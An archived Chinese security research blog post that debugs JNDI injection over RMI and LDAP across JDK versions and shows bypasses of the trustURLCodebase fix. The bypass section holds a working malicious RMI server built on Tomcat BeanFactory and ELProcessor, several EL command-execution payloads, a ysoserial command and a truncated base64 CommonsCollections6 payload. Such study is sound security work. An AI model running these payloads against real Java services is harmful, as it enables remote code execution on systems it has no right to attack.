## 0x00 前言

本篇主要是填前面的坑，是[《浅析JNDI注入》](https://web.archive.org/web/20221208235051/http://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/)的延续篇，主要调试分析高低版本JDK下JNDI注入的RMI和LDAP两个攻击向量的调用过程及其异同点，再复现调试网上公布的高版本JDK绕过方法。

## 0x01 调试分析高低版JDK下的JNDI注入

这里只对常用的RMI和LDAP两个攻击向量进行调试分析。

### RMI

#### 低版本

以之前[lookup参数注入的Demo](https://web.archive.org/web/20221208235051/http://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/#漏洞点1——lookup参数注入)来调试分析下，将RMI服务端的factoryLocation参数改为`http://127.0.0.1:8000/`，本地JDK为8u112。

直接在com.sun.jndi.rmi.registry.RegistryContext类的lookup()函数下打上断点，此时函数调用栈如下：

```
lookup:124, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:13, AClient
```

其中从RMI注册表中lookup查询到服务端中目标类的Reference后返回一个ReferenceWrapper_Stub类实例，该类实例就是客户端的存根、用于实现和服务端进行交互，最后调用decodeObject()函数来解析：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/27.png)

跟进decodeObject()函数中，先判断入参ReferenceWrapper_Stub类实例是否是RemoteReference接口实现类实例，而ReferenceWrapper_Stub类正是实现RemoteReference接口类的，因此通过判断调用getReference()来获取到ReferenceWrapper_Stub类实例中的Reference即我们在恶意RMI注册中绑定的恶意Reference；再往下调用NamingManager.getObjectInstance()来获取远程服务端上的类实例：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/28.png)

跟进，调用到getObjectFactoryFromReference()函数，尝试从Reference中获取ObjectFactory：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/29.png)

跟进，通过codebase和factoryName来调用loadClass()函数来远程加载恶意类EvilClassFactory，最后直接通过newInstance()实例化该远程恶意类并返回：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/30.png)

注意，**这里返回新建的远程类实例之前会先对实例转换为ObjectFactory类，因此，如果远程类不实现ObjectFactory接口类的话就会在此处报错，之前一些demo的恶意类没实现ObjectFactory类所出现的报错正出于此**。

执行完newInstance()之后就触发漏洞了：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/31.png)

再往下就是判断新建的远程类实例是否为null，不为null则调用该远程类的getObjectInstance()函数并返回，否则直接返回Reference实例。从这里知道，**其实恶意类的恶意代码除了能写在无参构造函数外，也可以写在重写的getObjectInstance()函数中来触发**。

至此，整个调用过程调试完毕。

#### 高版本

在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。

这里更换8u251版本的JDK来继续调试。

直接运行会报如下错误，说该ObjectFactory是不可信的，除非设置com.sun.jndi.rmi.object.trustURLCodebase项的值为true：

```
[*]Using lookup() to fetch object with rmi://127.0.0.1:1688/exp
Exception in thread "main" javax.naming.ConfigurationException: The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.
	at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at AClient.main(AClient.java:13)
```

前面的调用过程是一样的，这里直接根据报错在com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数打断点调试就好，此时函数调用栈：

```
decodeObject:495, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:13, AClient
```

看到，在调用NamingManager.getObjectInstance()函数获取Reference指定的远程类之前先进行com.sun.jndi.rmi.object.trustURLCodebase值的判断，该值默认为false因此直接抛出错误：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/1.png)

#### 修补点源码对比

对比下新旧版JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数的代码就很清楚了：

```
// 低版本JDK
    private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }


// 高版本JDK
    private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            Reference var8 = null;
            if (var3 instanceof Reference) {
                var8 = (Reference)var3;
            } else if (var3 instanceof Referenceable) {
                var8 = ((Referenceable)((Referenceable)var3)).getReference();
            }

            if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
                throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
            } else {
                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
            }
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }
```

很明显，**就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false**。

### LDAP

#### 低版本

以之前[LDAP+Reference的Demo](https://web.archive.org/web/20221208235051/http://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/#LDAP-Reference利用技巧)来调试分析下，本地JDK为8u181。

先看下，我们在恶意LDAP服务端的sendResult()函数中设置了如下属性项：

```
e.addAttribute("javaClassName", "Exploit");
e.addAttribute("javaCodeBase", cbstring);
e.addAttribute("objectClass", "javaNamingReference");
e.addAttribute("javaFactory", this.codebase.getRef());
```

直接在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数上打上断点，此时函数调用栈如下，看到就是不同几个类的lookup()函数在逐次调用：

```
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, LdapClient
```

往下调试看到，var4变量是BasicAttributes类实例、其值是我们在恶意LDAP服务端设置的属性值，因为设置了javaClassName属性值为”Exploit”，因此调用了decodeObject()函数来对var4进行对象解码操作：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/8.png)

跟进decodeObject()函数中，先调用getCodebases()函数获取到javaCodeBase项设置的URL地址`http://127.0.0.1:8000/`，接着两个判断是否存在javaSerializedData和javaRemoteLocation这两项的值，这里由于没设置就直接进入最后的else语句逻辑，最后由于var1不为null且var1值为前面设置的objectClass内容因此直接调用到decodeReference()函数来进一步解码Reference：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/9.png)

在decodeReference()函数中，根据设置的javaFactory、javaClassName、javaCodeBase等项来通过执行`Reference("EvilObject", null, "http://127.0.0.1:8000/")`来新建一个Reference类实例，最后直接返回该Reference类实例：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/10.png)

decodeObject()函数执行完返回Reference类实例后，继续在com.sun.jndi.ldap.LdapCtx类的c_lookup()函数往下调试，看到最后是调用到了DirectoryManager.getObjectInstance()函数：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/20.png)

跟进去getObjectInstance()函数的调用，看到其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory后再调用getObjectInstance()函数来获取实际的对象实例：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/21.png)

跟进getObjectFactoryFromReference()函数中，其中通过factoryName和codebase来调用loadClass()函数从`http://127.0.0.1:8000/EviObject`中远程加载类（在loadClass()函数中实际是通过FactoryURLClassLoader加载器来加载远程Factory URL类）：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/22.png)

获取到远程恶意类EvilObject后，直接调用newInstance()函数新建该恶意类实例：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/23.png)

而此时由于EvilObject类的恶意代码是写在无参构造函数中的，因此即使无法成功获取到Object实例也能直接触发漏洞：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/24.png)

**注意：上述报错的原因在于恶意远程类没有实现ObjectFactory接口类，具体原因后面会调试分析到。当然，实现了该接口就不会出现这种报错了。**

#### 高版本

JDK 6u211、7u201、8u191之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项。

这里更换8u251版本的JDK来继续调试。

前面的函数调用过程和低版本是一样的，直接看下不同的地方，**就是在getObjectFactoryFromReference()函数中调用loadClass()函数时返回了null**，直接在com.sun.naming.internal.VersionHelper12类loadClass()函数上打断点调试，此时函数调用栈如下：

```
loadClass:101, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, LdapClient
```

看到这里添加了个if判断条件，检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，是的话才能正常通过URLClassLoader来加载远程类，否则返回null：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/2.png)

看到常量trustURLCodebase定义处的源码（位于com.sun.naming.internal.VersionHelper12），可以看到该值是从系统设置找那个获取的，默认为FALSE：

```
/**
 * Determines whether classes may be loaded from an arbitrary URL code base.
 */
private static final String TRUST_URL_CODEBASE_PROPERTY =
        "com.sun.jndi.ldap.object.trustURLCodebase";
private static final String trustURLCodebase =
        AccessController.doPrivileged(
            new PrivilegedAction<String>() {
                public String run() {
                    try {
                    return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
                        "false");
                    } catch (SecurityException e) {
                    return "false";
                    }
                }
            }
        );
```

由于loadClass()函数返回的是null，因此getObjectFactoryFromReference()函数同样返回null：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/25.png)

getObjectFactoryFromReference()函数返回的null跳过了中间两个getObjectInstance()函数调用而直接返回refInfo：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/26.png)

再往后也是返回该Reference类实例直至执行完流程。

#### 修补点源码对比

现在比较下新旧版本的com.sun.naming.internal.VersionHelper12类loadClass()函数：

```
// 旧版本JDK
	/**
     * @param className A non-null fully qualified class name.
     * @param codebase A non-null, space-separated list of URL strings.
     */
    public Class<?> loadClass(String className, String codebase)
            throws ClassNotFoundException, MalformedURLException {

        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                 URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    }


// 新版本JDK
    /**
     * @param className A non-null fully qualified class name.
     * @param codebase A non-null, space-separated list of URL strings.
     */
    public Class<?> loadClass(String className, String codebase)
            throws ClassNotFoundException, MalformedURLException {
        if ("true".equalsIgnoreCase(trustURLCodebase)) {
            ClassLoader parent = getContextClassLoader();
            ClassLoader cl =
                    URLClassLoader.newInstance(getUrlArray(codebase), parent);

            return loadClass(className, cl);
        } else {
            return null;
        }
    }
```

很明显，**就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false**。

## 0x02 绕过高版本JDK（8u191+）限制

由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

KINGX提到了如下两种绕过方式：

> 1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。
> 2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。
>
> 这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。

简单地说，**在低版本JDK的JNDI注入中，主要利用的就是classFactoryLocation这个参数来实现远程加载类利用的。但是在高版本JDK中对classFactoryLocation这个途径实现了限制，但是对于classFactory这个参数即本地ClassPath中如果存在Gadget的话还是能够进行JNDI注入攻击的**。

### 利用本地恶意Class作为Reference Factory

简单地说，就是要服务端本地ClassPath中存在恶意Factory类可被利用来作为Reference Factory进行攻击利用。该恶意Factory类必须实现`javax.naming.spi.ObjectFactory`接口，实现该接口的getObjectInstance()方法。

大佬找到的是这个`org.apache.naming.factory.BeanFactory`类，其满足上述条件并存在于Tomcat依赖包中，应用广泛。该类的getObjectInstance()函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。

现在来看下RMI攻击向量的代码是如何实现的。

#### 攻击利用

具体依赖Tomcat中的jar包为：catalina.jar、el-api.jar、jasper-el.jar。

恶意RMI服务端：

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServer {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 6666");
        Registry registry = LocateRegistry.createRegistry( 6666);
        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
        ref.add(new StringRefAddr("forceString", "x=eval"));
        // 利用表达式执行命令
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'touch /tmp/mi1k7ea']).start()\")"));
        System.out.println("[*]Evil command: touch /tmp/mi1k7ea");
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

JNDI客户端：

```
import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:6666/Object";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
```

打包成jar，在Linux环境（Java版本为1.8.0_252）下运行该jar包，监听在6666端口：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/11.png)

这里通过`-classpath`或`-cp`参数来假设是服务端的含有Tomcat相关jar包的ClassPath环境，运行即可成功执行命令：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/12.png)

#### 几种变体的表达式

前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法：

```
import javax.el.ELProcessor;

public class Test {
    public static void main(String[] args) {
        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
                ".newInstance().getEngineByName('nashorn')" +
                ".eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")";
//        String poc = "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())" +
//                ".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')" +
//                ".invoke(null),'calc.exe')}";
//        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +
//                ".newInstance().getEngineByName('JavaScript')" +
//                ".eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";
        new ELProcessor().eval(poc);
    }
}
```

#### 调试分析

直接在org.apache.naming.factory.BeanFactory类getObjectInstance()函数上打上断点debug，此时函数调用栈如下：

```
getObjectInstance:119, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:8, Client
```

这里注意到javax.naming.spi.NamingManager类的getObjectInstance()函数，其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory类实例，跟进去会发现是通过loadClass()函数来加载我们传入的org.apache.naming.factory.BeanFactory类，然后新建该类实例并将其转换成ObjectFactory类型，也就是说，**我们传入的Factory类必须实现ObjectFactory接口类、而org.apache.naming.factory.BeanFactory正好满足这一点**：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/14.png)

往下，直接调用ObjectFactory接口实现类实例的getObjectInstance()函数，这里是BeanFactory类实例的getObjectInstance()函数：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/15.png)

跟进看到org.apache.naming.factory.BeanFactory类的getObjectInstance()函数中，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，**这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例**：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/13.png)

接着获取Bean类为`javax.el.ELProcessor`后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的`x=eval`内容：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/16.png)

继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，**之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！**之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/17.png)

接着是多个do while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/18.png)

获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行`new ELProcessor().eval("".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd', '/C', 'calc.exe']).start()"))`：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/19.png)

#### 小结

小结一下几个关键点：

- 这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是`org.apache.naming.factory.BeanFactory`；
- 由于`org.apache.naming.factory.BeanFactory`类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的`javax.el.ELProcessor`类；
- ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为`forceString`、内容为`x=eval`的StringRefAddr类实例，这里看`org.apache.naming.factory.BeanFactory`类的getObjectInstance()方法源码发现，程序会判断是否存在`=`号，若存在则将`x`属性的默认setter方法设置为我们`eval`；第二次是类型为`x`、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的`x`属性关联起来，`x`属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用`javax.el.ELProcessor`类的eval()函数执行恶意表达式从而达到攻击利用的目的；

### 利用LDAP返回序列化数据，触发本地Gadget

之前在JNDI注入的文章中讲到了可以利用LDAP+Reference的方式进行攻击利用，但是在JDK 8u191以后的版本中增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。但是，攻击者仍然可以通过服务端本地ClassPath中存在的反序列化漏洞Gadget来绕过高版本JDK的限制。

LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。此时，如果服务端ClassPath中存在反序列化咯多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。

#### 攻击利用

假设目标环境存在Commons-Collections-3.2.1包，且存在JNDI的lookup()注入或Fastjson反序列化漏洞。

使用ysoserial工具生成Commons-Collections这条Gadget并进行Base64编码输出：

```
java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections6 'calc' | base64
```

输出如下：

```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdn